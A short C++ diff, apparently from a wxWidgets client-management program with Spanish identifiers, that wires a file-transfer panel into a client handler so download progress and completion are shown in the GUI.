@@ -17,6 +17,7 @@
 #include "panel_escaner.hpp"
 #include "panel_fun.hpp"
 #include "panel_reverse_proxy.hpp"
+#include "panel_transfer.hpp"
 #include "file_editor.hpp"
 
 //Definir el servidor globalmente
@@ -652,6 +653,11 @@ void Cliente_Handler::Transfers_Fin(const std::string& strID) {
     if (iRet != -1) {
         std::unique_lock<std::mutex> lock(this->mt_Archivos);
         this->vcArchivos_Descarga[iRet].transfer.isDone = true;
+
+        panelTransfer* temp = (panelTransfer*)wxWindow::FindWindowByName("TRANSFER-" + strID);
+        if (temp) {
+            temp->DoneOmar();
+        }
     }
 }
 
@@ -671,6 +677,11 @@ void Cliente_Handler::Transfers_IncreSize(const std::string& strID, int iSize) {
     if (iRet != -1) {
         std::unique_lock<std::mutex> lock(this->mt_Archivos);
         this->vcArchivos_Descarga[iRet].transfer.uDescargado += iSize;
+        
+        panelTransfer* temp = (panelTransfer*)wxWindow::FindWindowByName("TRANSFER-" + strID);
+        if (temp) {
+            temp->AgregarProgreso(this->vcArchivos_Descarga[iRet].transfer.uDescargado, this->vcArchivos_Descarga[iRet].transfer.uTamano);
+        }
     }
 }
 
